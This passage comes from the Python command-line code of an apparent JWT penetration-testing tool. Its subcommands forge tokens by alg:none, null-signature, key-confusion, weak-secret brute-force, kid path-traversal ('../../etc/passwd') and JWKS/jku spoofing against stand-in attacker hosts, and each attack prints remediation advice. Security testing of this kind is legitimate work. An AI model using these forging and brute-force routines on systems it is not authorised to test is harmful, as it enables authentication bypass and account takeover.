    \b
    Examples:
      python apileaks.py jwt verify TOKEN --secret mysecret
      python apileaks.py jwt verify TOKEN --key-file public.pem
      python apileaks.py jwt verify TOKEN --pem "$(cat public.pem)"
      python apileaks.py jwt verify TOKEN --jwks jwks.json
    """
    try:
        # A JWKS source is read locally (no network, Req 65.3) and converted
        # via reconstruct_public_key_from_jwks inside verify_token. A read/parse
        # failure names the offending key source (Req 65.4).
        jwks_dict = None
        if jwks_file is not None:
            try:
                with open(jwks_file) as fh:
                    jwks_dict = json.loads(fh.read())
            except FileNotFoundError:
                raise ValueError(f"Could not read JWKS file '{jwks_file}': file not found") from None
            except json.JSONDecodeError as exc:
                raise ValueError(f"Could not parse JWKS file '{jwks_file}': {exc}") from exc
            except OSError as exc:
                raise ValueError(f"Could not read JWKS file '{jwks_file}': {exc}") from exc

        result = verify_token(
            token,
            secret=secret,
            key_file=key_file,
            pem=pem,
            jwks=jwks_dict,
        )

        status = "✅ VALID" if result.valid else "❌ INVALID"
        click.echo("\n" + "=" * 60)
        click.echo("JWT Signature Verification")
        click.echo("=" * 60)
        click.echo(f"\n🔎 Algorithm: {result.algorithm}")
        click.echo(f"🔑 Key Source: {result.key_source}")
        click.echo(f"📋 Signature: {status}")
        click.echo("\n" + "=" * 60)

        # A failed verification is a reported result, not an error condition.
        sys.exit(0 if result.valid else 1)

    except ValueError as e:
        click.echo(f"❌ Error verifying JWT: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command('genkey')
@click.option('--type', 'key_type', type=click.Choice(['rsa', 'ec']), default='rsa',
              show_default=True, help='Keypair type to generate')
@click.option('--bits', type=int, default=2048, show_default=True,
              help='RSA modulus size in bits (used when --type rsa)')
@click.option('--curve', type=click.Choice(['ES256', 'ES384', 'ES512']), default='ES256',
              show_default=True, help='EC curve/algorithm (used when --type ec)')
@click.pass_context
def jwt_genkey_cmd(ctx, key_type, bits, curve):
    """Generate a test RSA or EC keypair and emit the PEM material (local-only)

    No HTTP request is issued (Requirement 66.4). Emits both the generated
    private and public key material (Requirement 66.1).

    \b
    Examples:
      python apileaks.py jwt genkey --type rsa
      python apileaks.py jwt genkey --type rsa --bits 4096
      python apileaks.py jwt genkey --type ec --curve ES256
    """
    try:
        if key_type == 'rsa':
            private_pem, public_pem = generate_rsa_keypair(bits=bits)
            label = f"RSA {bits}-bit"
        else:
            private_pem, public_pem = generate_ec_keypair(curve=curve)
            label = f"EC {curve}"

        click.echo("\n" + "=" * 60)
        click.echo(f"Generated {label} keypair")
        click.echo("=" * 60)
        click.echo("\n🔑 Private Key (PEM):\n")
        click.echo(private_pem.strip())
        click.echo("\n📢 Public Key (PEM):\n")
        click.echo(public_pem.strip())
        click.echo("\n" + "=" * 60)
        sys.exit(0)

    except ValueError as e:
        click.echo(f"❌ Error generating keypair: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command('jwks-to-key')
@click.option('--jwks', 'jwks_file', type=click.Path(), required=True,
              help='Path to a JWKS file (single JWK entry or {"keys": [...]})')
@click.pass_context
def jwt_jwks_to_key_cmd(ctx, jwks_file):
    """Reconstruct a public key PEM from a local JWKS entry (network-free)

    Converts RSA n/e or EC crv/x/y parameters into a usable public key
    (Requirement 66.2) reusing the same JWK-to-key conversion as the attack
    engine (Requirement 66.3). No HTTP request is issued (Requirement 66.4).
    Unparseable or parameter-missing input is rejected with a descriptive
    error (Requirement 66.5).

    \b
    Examples:
      python apileaks.py jwt jwks-to-key --jwks jwks.json
    """
    try:
        # The JWKS file is read locally (no network, Req 66.4). A read/parse
        # failure names the offending source (Req 66.5).
        try:
            with open(jwks_file) as fh:
                jwks_data = json.loads(fh.read())
        except FileNotFoundError:
            raise ValueError(f"Could not read JWKS file '{jwks_file}': file not found") from None
        except json.JSONDecodeError as exc:
            raise ValueError(f"Could not parse JWKS file '{jwks_file}': {exc}") from exc
        except OSError as exc:
            raise ValueError(f"Could not read JWKS file '{jwks_file}': {exc}") from exc

        # Accept either a full JWKS ({"keys": [...]}) or a single JWK entry.
        if isinstance(jwks_data, dict) and 'keys' in jwks_data:
            keys = jwks_data.get('keys')
            if not isinstance(keys, list) or not keys:
                raise ValueError(
                    f"JWKS file '{jwks_file}' contains no key entries to reconstruct"
                )
            jwk = keys[0]
        else:
            jwk = jwks_data

        public_pem = reconstruct_public_key_from_jwks(jwk)

        click.echo("\n" + "=" * 60)
        click.echo("Reconstructed Public Key from JWKS")
        click.echo("=" * 60)
        click.echo("\n📢 Public Key (PEM):\n")
        click.echo(public_pem.strip())
        click.echo("\n" + "=" * 60)
        sys.exit(0)

    except ValueError as e:
        click.echo(f"❌ Error reconstructing public key: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-alg-none')
@click.argument('token')
@click.option('--payload', help='Custom payload to inject (JSON format)')
@click.option('--url', '-u', help='Target URL to test alg:none attack against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_alg_none(ctx, token, payload, url, header, data, timeout):
    """Test algorithm confusion attack with alg:none

    \b
    🧪 CRITICAL SEVERITY ATTACK
    Algorithm confusion - completely nullifies authentication by:

    1️⃣ Rewriting header: "alg": "none"\b
    2️⃣ Removing signature completely\b
    3️⃣ Inserting malicious payload\b
    4️⃣ Sending unsigned token\b
    5️⃣ Testing privileged access


    \b
    Examples:
      # Basic alg:none test
      python apileaks.py jwt test-alg-none TOKEN

      # Test with custom admin payload
      python apileaks.py jwt test-alg-none TOKEN --payload '{"sub":"admin","role":"admin"}'

      # Test against real endpoint
      python apileaks.py jwt test-alg-none TOKEN --url https://api.example.com/admin
    """
    try:
        click.echo("🔍 Algorithm Confusion Attack (alg:none)")
        click.echo("="*45)
        click.echo("🔥 SEVERITY: CRITICAL - Authentication Completely Nullified")
        click.echo("")

        custom_headers = _parse_custom_headers(header)

        # Decode original token for display
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). If a custom payload is supplied
        # it is merged onto the base token before running the vector.
        base_token = token
        if payload:
            try:
                custom_payload = json.loads(payload)
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
            merged = copy.deepcopy(decoded['payload'])
            merged.update(custom_payload)
            base_token = encode_jwt(decoded['header'], merged, 'secret')

        _run_jwt_vector(base_token, AttackType.ALG_NONE, url, custom_headers,
                        data, timeout)

        click.echo("\n💡 REMEDIATION:")
        click.echo("• Configure JWT library to REJECT alg:none tokens")
        click.echo("• Implement algorithm whitelist (e.g., only allow HS256, RS256)")
        click.echo("• Never trust the algorithm specified in JWT header")
        click.echo("• Use proper JWT validation libraries, not custom implementations")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-null-signature')
@click.argument('token')
@click.option('--payload', help='Custom payload to inject (JSON format)')
@click.option('--url', '-u', help='Target URL to test null signature attack against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_null_signature(ctx, token, payload, url, header, data, timeout):
    """Test null signature vulnerability

    \b
    🧾 CRITICAL SEVERITY ATTACK
    Null/empty signature acceptance - cryptographic validation bypass by:

    1️⃣ Sending JWT with empty signature: header.payload.\b
    2️⃣ Inserting admin payload\b
    3️⃣ Testing against protected endpoint\b
    4️⃣ Confirming bypass of signature validation

    \b
    Examples:
      # Basic null signature test
      python apileaks.py jwt test-null-signature TOKEN

      # Test with custom admin payload
      python apileaks.py jwt test-null-signature TOKEN --payload '{"sub":"admin","admin":true}'

      # Test against real endpoint
      python apileaks.py jwt test-null-signature TOKEN --url https://api.example.com/protected
    """
    try:
        click.echo("🔍 Null Signature Vulnerability Test")
        click.echo("="*40)
        click.echo("🔥 SEVERITY: CRITICAL - Cryptographic Validation Bypass")
        click.echo("")

        custom_headers = _parse_custom_headers(header)

        # Decode original token for display
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). A custom payload is merged onto
        # the base token before running the vector.
        base_token = token
        if payload:
            try:
                custom_payload = json.loads(payload)
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
            merged = copy.deepcopy(decoded['payload'])
            merged.update(custom_payload)
            base_token = encode_jwt(decoded['header'], merged, 'secret')

        _run_jwt_vector(base_token, AttackType.NULL_SIGNATURE, url, custom_headers,
                        data, timeout)

        click.echo("\n💡 REMEDIATION:")
        click.echo("• Implement proper signature validation - never accept empty signatures")
        click.echo("• Validate signature length and format before verification")
        click.echo("• Use established JWT libraries with proper validation")
        click.echo("• Implement signature presence checks before cryptographic verification")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


def _load_public_key_material_cli(material):
    """Resolve operator-supplied public-key material for the CLI.

    ``material`` may be a filesystem path to a PEM/DER file or inline PEM
    text. Returns raw bytes when a readable file is found (so binary DER works),
    otherwise the original string (inline PEM). Mirrors the auth module's
    path-or-inline resolution so both entry points behave identically.
    """
    try:
        path = Path(material)
        if path.exists() and path.is_file():
            return path.read_bytes()
    except (OSError, ValueError):
        pass
    return material


@jwt.command('test-alg-confusion')
@click.argument('token')
@click.option('--public-key', 'public_key', required=True, metavar='PATH_OR_PEM',
              help='Target RSA/EC public key (PEM/DER file path or inline PEM) used as the HMAC secret')
@click.option('--payload', help='Custom payload to inject (JSON format)')
@click.option('--url', '-u', help='Target URL to test the confusion attack against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_alg_confusion(ctx, token, public_key, payload, url, header, data, timeout):
    """Test algorithm/key confusion attack (RS256/ES256 -> HS256 substitution)

    \b
    🧪 CRITICAL SEVERITY ATTACK
    Algorithm confusion (aka Substitution Attack) forges a token that a server
    validates with the SAME public key it uses for RS*/ES* verification, but
    treated as an HS256 HMAC secret:

    1️⃣ Switch the header alg from RS256/ES256 to HS256\b
    2️⃣ HMAC-sign header.payload using the server's PUBLIC KEY bytes as the secret\b
    3️⃣ Every public-key representation is tried (PEM ±newline, DER, x5c cert)\b
    4️⃣ A server that accepts the forged token confuses the key's role

    \b
    Examples:
      # Generate confusion tokens for manual testing
      python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem

      # Inject an admin payload and test against a live endpoint
      python apileaks.py jwt test-alg-confusion TOKEN --public-key key.pem \\
          --payload '{"role":"admin"}' --url https://api.example.com/admin
    """
    try:
        click.echo("🔍 Algorithm/Key Confusion Attack (RS256/ES256 -> HS256)")
        click.echo("="*55)
        click.echo("🔥 SEVERITY: CRITICAL - Signature forged with the public key")
        click.echo("")

        custom_headers = _parse_custom_headers(header)
        public_key_material = _load_public_key_material_cli(public_key)

        # Decode original token for display.
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Merge a custom payload onto the base token before running the vector.
        base_token = token
        if payload:
            try:
                custom_payload = json.loads(payload)
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
            merged = copy.deepcopy(decoded['payload'])
            merged.update(custom_payload)
            base_token = encode_jwt(decoded['header'], merged, 'secret')

        _run_jwt_vector(base_token, AttackType.ALGORITHM_CONFUSION, url,
                        custom_headers, data, timeout,
                        public_key_material=public_key_material)

        click.echo("\n💡 REMEDIATION:")
        click.echo("• Bind each key to a single algorithm; never share keys across alg families")
        click.echo("• Enforce an algorithm allowlist (e.g. only RS256) during verification")
        click.echo("• Never let the token header dictate the verification algorithm")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('brute-secret')
@click.argument('token')
@click.option('--wordlist', '-w', default='wordlists/jwt_secrets.txt', help='Wordlist file for secret brute-force')
@click.option('--max-attempts', default=1000, help='Maximum brute-force attempts')
@click.option('--url', '-u', help='Target URL to test recovered secret against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_brute_secret(ctx, token, wordlist, max_attempts, url, header, data, timeout):
    """Brute-force weak HMAC secrets and test exploitation

    \b
    🔐 CRITICAL SEVERITY ATTACK
    This attack attempts to crack JWT HMAC secrets and demonstrates
    complete authentication compromise by:

    1️⃣ Confirming JWT uses HS* algorithm\b
    2️⃣ Executing brute-force/dictionary attack\b
    3️⃣ Recovering the real secret\b
    4️⃣ Forging new JWT with modified claims\b
    5️⃣ Testing real API access with forged token\b


    \b
    Examples:
      # Basic secret brute-force
      python apileaks.py jwt brute-secret TOKEN

      # Test exploitation against real endpoint
      python apileaks.py jwt brute-secret TOKEN --url https://api.example.com/admin

      # Full exploitation test with custom headers
      python apileaks.py jwt brute-secret TOKEN -u URL -H "X-API-Key: key123"
    """
    try:
        click.echo("🔍 JWT HMAC Secret Brute-Force Attack")
        click.echo("="*45)
        click.echo("🔥 SEVERITY: CRITICAL - Complete Authentication Compromise")
        click.echo("")

        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()

        # Check if wordlist exists
        if not Path(wordlist).exists():
            click.echo(f"❌ Wordlist not found: {wordlist}")
            click.echo("Creating default wordlist...")

            # Create default wordlist
            Path(wordlist).parent.mkdir(exist_ok=True)
            default_secrets = [
                "secret", "password", "123456", "admin", "jwt_secret",
                "your_secret_key", "mysecret", "key", "token", "auth",
                "api_key", "private_key", "hmac_secret", "signing_key",
                "jwt_key", "access_token", "refresh_token", "session_key",
                "", "null", "undefined", "test", "dev", "development",
                "prod", "production", "staging", "demo", "example"
            ]

            with open(wordlist, 'w') as f:
                for secret in default_secrets:
                    f.write(f"{secret}\n")

            click.echo(f"✅ Created default wordlist: {wordlist}")

        # Load secrets from wordlist
        with open(wordlist) as f:
            secrets = [line.strip() for line in f if line.strip() and not line.startswith('#')]

        # Decode token to get header and payload
        decoded = decode_jwt(token)

        # 1️⃣ Confirm JWT uses HS* algorithm
        algorithm = decoded['header'].get('alg', '').upper()
        if not algorithm.startswith('HS'):
            click.echo(f"⚠️  WARNING: Token uses {algorithm} algorithm, not HMAC")
            click.echo("   This attack only works against HS256, HS384, HS512")
            if not click.confirm("Continue anyway?"):
                return

        click.echo(f"✅ Target algorithm: {algorithm}")
        click.echo(f"📋 Testing {min(len(secrets), max_attempts)} secrets...")
        click.echo("")

        # 2️⃣ & 3️⃣ Recover the secret by SIGNATURE VERIFICATION (Req 16.1-16.3).
        # A candidate is recovered if and only if verify_hmac_secret is True:
        # the HMAC over the ORIGINAL raw header.payload segments equals the
        # original signature. We never re-encode the full token and string-
        # compare it to the original (Req 16.2), which previously missed valid
        # secrets due to re-serialization differences. ``None`` sentinel is used
        # so a legitimately recovered empty-string secret is not treated as
        # "not found".
        found_secret = None
        candidates = secrets[:max_attempts]
        for i, secret in enumerate(candidates):
            if i % 50 == 0 and i > 0:
                click.echo(f"🔄 Progress: {i}/{len(candidates)} ({(i/len(candidates)*100):.1f}%)")
            try:
                if verify_hmac_secret(token, secret):
                    found_secret = secret
                    break
            except Exception:
                continue

        if found_secret is None:
            click.echo("\n❌ Secret not found in wordlist")
            click.echo("💡 Try a larger wordlist or the secret may be strong")
            return

        # 🎉 SECRET RECOVERED! Report the recovered secret AND the matching
        # algorithm (Req 16.4). The matching algorithm is the header ``alg`` that
        # verify_hmac_secret validated the signature against.
        click.echo("\n" + "="*60)
        click.echo("🎉 SUCCESS! HMAC SECRET RECOVERED!")
        click.echo("="*60)
        click.echo(f"🔑 Recovered Secret: '{found_secret}'")
        click.echo(f"🧮 Matching Algorithm: {algorithm}")
        click.echo("⚠️  This JWT uses a weak secret that can be brute-forced!")
        click.echo("")

        # 4️⃣ & 5️⃣ Forge and exploit through the single-source-of-truth engine.
        # Using the recovered secret as the signing key, the engine forges the
        # privilege-escalation / impersonation / expiration-bypass tokens and,
        # when a URL is supplied, issues them through the shared HTTPRequestEngine
        # (Req 17.1). Success is decided by the engine's response analyzer, never
        # by admin/dashboard keyword presence (Req 19.2).
        forge_vectors = (
            AttackType.WEAK_SECRET,
            AttackType.PRIVILEGE_ESCALATION,
            AttackType.USER_IMPERSONATION,
            AttackType.EXPIRATION_BYPASS,
        )

        if url:
            click.echo("4️⃣ Forging and testing exploitation tokens via JWTAttackEngine...")
            click.echo(f"🎯 Target: {url}")

            async def _run():
                http_engine = _build_jwt_http_engine(timeout)
                try:
                    engine = _make_jwt_engine(
                        token, url, custom_headers, data,
                        http_engine=http_engine, signing_secret=found_secret)
                    for attack_type in forge_vectors:
                        result = await engine.execute_attack(attack_type)
                        _report_attack_result(result)
                finally:
                    await http_engine.close()

            asyncio.run(_run())
        else:
            click.echo("4️⃣ Forging exploitation tokens via JWTAttackEngine...")
            engine = _make_jwt_engine(
                token, url, custom_headers, data, signing_secret=found_secret)
            for attack_type in forge_vectors:
                _display_generated_tokens(engine, attack_type)
            click.echo("\n⚠️  Provide --url to test the forged tokens against an endpoint")

        # Summary and recommendations
        click.echo("\n" + "="*60)
        click.echo("🔥 ATTACK SUMMARY")
        click.echo("="*60)
        click.echo(f"✅ Secret recovered: '{found_secret}' (alg: {algorithm})")
        if url:
            click.echo("✅ Endpoint testing completed")

        click.echo("\n💡 REMEDIATION:")
        click.echo("• Use a strong, randomly generated HMAC secret (32+ characters)")
        click.echo("• Consider switching to RS256 (asymmetric) algorithm")
        click.echo("• Implement proper secret rotation policies")
        click.echo("• Never use default or common secrets")

        if found_secret in ["secret", "password", "123456", ""]:
            click.echo(f"\n🚨 CRITICAL: Using extremely weak secret '{found_secret}'!")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-kid-injection')
@click.argument('token')
@click.option('--kid-payload', default='../../etc/passwd', help='Kid injection payload')
@click.option('--payload', help='Custom JWT payload to inject (JSON format)')
@click.option('--url', '-u', help='Target URL to test kid injection against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_kid_injection(ctx, token, kid_payload, payload, url, header, data, timeout):
    """Test Key ID (kid) injection vulnerability

    \b
    🗝️ HIGH → CRITICAL SEVERITY ATTACK
    Key ID (kid) injection - depends on backend implementation:

    1️⃣ Injecting malicious kid parameter
    2️⃣ Testing local file paths: "kid": "../../etc/passwd"
    3️⃣ Testing remote URLs: "kid": "http://attacker/key.pem"
    4️⃣ Signing token with controlled key
    5️⃣ Testing real API access

    \b
    🧪 Expected Exploitation:
    • File disclosure (path traversal)
    • Validation with arbitrary keys
    • Remote key fetching from attacker server
    • Potential RCE in vulnerable parsers

    \b
    Examples:
      # Basic kid injection test
      python apileaks.py jwt test-kid-injection TOKEN

      # Test with custom kid payload
      python apileaks.py jwt test-kid-injection TOKEN --kid-payload "http://evil.com/key.pem"

      # Test with custom JWT payload
      python apileaks.py jwt test-kid-injection TOKEN --payload '{"sub":"admin","role":"admin"}'

      # Test against real endpoint with both custom payloads
      python apileaks.py jwt test-kid-injection TOKEN --kid-payload "../../etc/passwd" --payload '{"admin":true}' --url https://api.example.com/protected
    """
    try:
        click.echo("🔍 Key ID (kid) Injection Attack")
        click.echo("="*40)
        click.echo("🔥 SEVERITY: HIGH → CRITICAL (depends on backend)")
        click.echo("")

        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()

        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated kid
        # injection payload set; a custom --payload is merged onto the base token.
        base_token = token
        if payload:
            try:
                custom_payload = json.loads(payload)
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
            merged = copy.deepcopy(decoded['payload'])
            merged.update(custom_payload)
            base_token = encode_jwt(decoded['header'], merged, 'secret')

        _run_jwt_vector(base_token, AttackType.KID_INJECTION, url, custom_headers,
                        data, timeout)

        click.echo("\n💡 REMEDIATION:")
        click.echo("• Validate and sanitize kid parameter before use")
        click.echo("• Use allowlist of permitted key identifiers")
        click.echo("• Never use kid parameter directly in file paths or URLs")
        click.echo("• Implement proper input validation and path traversal protection")
        click.echo("• Avoid dynamic key loading based on user input")
        click.echo("• Use static key stores with predefined key identifiers")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-jwks-spoof')
@click.argument('token')
@click.option('--jwks-url', default='http://attacker.com/jwks.json', help='Malicious JWKS URL')
@click.option('--url', '-u', help='Target URL to test JWKS spoofing against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_jwks_spoof(ctx, token, jwks_url, url, header, data, timeout):
    """Test JWKS spoofing vulnerability

    \b
    JWKS spoofing - breaks trust boundary by:

    1️⃣ Detecting JWKS endpoint usage\b
    2️⃣ Spoofing remote JWKS URL\b
    3️⃣ Publishing attacker-controlled keys\b
    4️⃣ Signing token with attacker key\b
    5️⃣ Testing real API access\b


    \b
    Examples:
      # Basic JWKS spoofing test
      python apileaks.py jwt test-jwks-spoof TOKEN

      # Test with custom malicious JWKS URL
      python apileaks.py jwt test-jwks-spoof TOKEN --jwks-url http://evil.com/jwks.json

      # Test against real endpoint
      python apileaks.py jwt test-jwks-spoof TOKEN --url https://api.example.com/protected
    """
    try:
        click.echo("🔍 JWKS Spoofing Attack")
        click.echo("="*30)
        click.echo("🔥 SEVERITY: CRITICAL - Trust Boundary Broken")
        click.echo("")

        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()

        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"� Original Paayload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated
        # jku/x5u spoofing URL set and signs with the resolved key.
        _run_jwt_vector(token, AttackType.JWKS_SPOOF, url, custom_headers,
                        data, timeout)

        click.echo("\n💡 REMEDIATION:")
        click.echo("• Implement JWKS URL allowlist - only trust known, legitimate URLs")
        click.echo("• Validate JWKS URLs against strict patterns")
        click.echo("• Use certificate pinning for JWKS endpoints")
        click.echo("• Implement network-level restrictions for JWKS fetching")
        click.echo("• Never trust user-controlled jku or x5u parameters")
        click.echo("• Consider using static key stores instead of dynamic JWKS")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-inline-jwks')
@click.argument('token')
@click.option('--url', '-u', help='Target URL to test inline JWKS injection against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_inline_jwks(ctx, token, url, header, data, timeout):
    """Test inline JWKS injection vulnerability

    \b
    Inline JWKS injection - total cryptographic validation control by:

    1️⃣ Generating attacker's own key pair\n
    2️⃣ Injecting JWKS inline in header\b
    3️⃣ Signing JWT with attacker's private key\b
    4️⃣ Sending token with embedded public key\b
    5️⃣ Testing admin access\b


    \b
    Examples:
      # Basic inline JWKS test
      python apileaks.py jwt test-inline-jwks TOKEN

      # Test against real endpoint
      python apileaks.py jwt test-inline-jwks TOKEN --url https://api.example.com/admin

      # Test with custom headers
      python apileaks.py jwt test-inline-jwks TOKEN -u URL -H "X-API-Key: key123"
    """
    try:
        click.echo("🔍 Inline JWKS Injection Attack")
        click.echo("="*35)
        click.echo("🔥 SEVERITY: CRITICAL - Total Cryptographic Control")
        click.echo("")

        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()

        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")

        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated
        # inline-JWK set and signs with the resolved key.
        _run_jwt_vector(token, AttackType.INLINE_JWKS, url, custom_headers,
                        data, timeout)

        click.echo("\n💡 REMEDIATION:")
        click.echo("• NEVER trust inline JWK parameters in JWT headers")
        click.echo("• Implement strict JWK source validation")
        click.echo("• Use static key stores with predefined keys only")
        click.echo("• Reject tokens with jwk, jku, x5u, or x5c parameters")
        click.echo("• Implement proper key management with trusted sources")
        click.echo("• Use certificate pinning for key validation")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('attack-test')
@click.argument('token', required=False)
@click.option('--url', '-u', help='Target URL to test JWT attacks against')
@click.option('--header', '-H', multiple=True, help='Custom headers (format: "Name: Value"). Can be used multiple times.')
@click.option('--data', '-d', help='POST data for request body (JSON format recommended)')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.option('--no-ssl-verify', is_flag=True, help='Disable SSL certificate verification for testing')
@click.option('--max-retries', default=3, help='Maximum retry attempts for failed requests (default: 3)')
@click.option('--fuzz-target', 'fuzz_target',
              help='Claim or header name to fuzz with values from --vector-file (Req 63.1)')
@click.option('--vector-file', 'vector_file', type=click.Path(),
              help='File of fuzz values (one per line) substituted into --fuzz-target (Req 63.6)')
@click.option('--raw-request', 'raw_request', type=click.Path(),
              help='Raw HTTP request file supplying the request context and JWT (Req 67.1)')
@click.option('--canary',
              help='Expected-success string that corroborates (never replaces) analyzer success (Req 67.3)')
@click.pass_context
def jwt_attack_test(ctx, token, url, header, data, timeout, no_ssl_verify,
                    max_retries, fuzz_target, vector_file, raw_request, canary):
    """Comprehensive JWT attack testing against live endpoints

    Performs automated security testing of JWT tokens against live API endpoints
    to identify common JWT vulnerabilities. This command executes multiple attack
    vectors and provides detailed vulnerability assessment with evidence.

    \b
    Attack Vectors Tested:
    • Algorithm Confusion Attacks
      - alg:none bypass (removes signature requirement)
      - Null signature attacks (various bypass techniques)
      - Algorithm downgrade (RS256 to HS256 confusion)

    • Secret-Based Attacks
      - Weak HMAC secret brute-force using common wordlists
      - Empty secret testing
      - Predictable secret patterns

    • Injection Attacks
      - Key ID (kid) injection (path traversal, command injection)
      - JWKS URL spoofing (jku parameter manipulation)
      - Inline JWKS injection (embed malicious public keys)

    • Payload Manipulation
      - Privilege escalation (modify role/admin claims)
      - User impersonation (change user identifier claims)
      - Expiration bypass (remove or extend exp claims)

    \b
    Response Analysis:
    • Compares attack responses against baseline (original token)
    • Detects authentication bypass indicators
    • Identifies privilege escalation attempts
    • Analyzes response timing for blind vulnerabilities
    • Provides confidence scoring for findings

    \b
    Required Arguments:
      TOKEN                 JWT token to use as base for attack generation

    \b
    Required Options:
      -u, --url URL         Target endpoint URL to test attacks against
                           Must be a complete URL (e.g., https://api.example.com/protected)

    \b
    Optional Parameters:
      -H, --header TEXT     Custom HTTP headers to include in all requests
                           Format: "Header-Name: Header-Value"
                           Can be specified multiple times for different headers
                           Example: -H "Authorization: Bearer token" -H "X-API-Key: key123"

      -d, --data TEXT       POST data to include in request body
                           Recommended format: JSON string
                           Example: -d '{"userId": 123, "action": "read"}'

      --timeout INTEGER     HTTP request timeout in seconds (default: 30)
                           Increase for slow endpoints or networks

      --no-ssl-verify       Disable SSL certificate verification
                           Use for testing against self-signed certificates
                           WARNING: Only use in testing environments

      --max-retries INTEGER Maximum retry attempts for failed requests (default: 3)
                           Helps handle temporary network issues

    \b
    Basic Usage Examples:
      # Test JWT against a protected endpoint
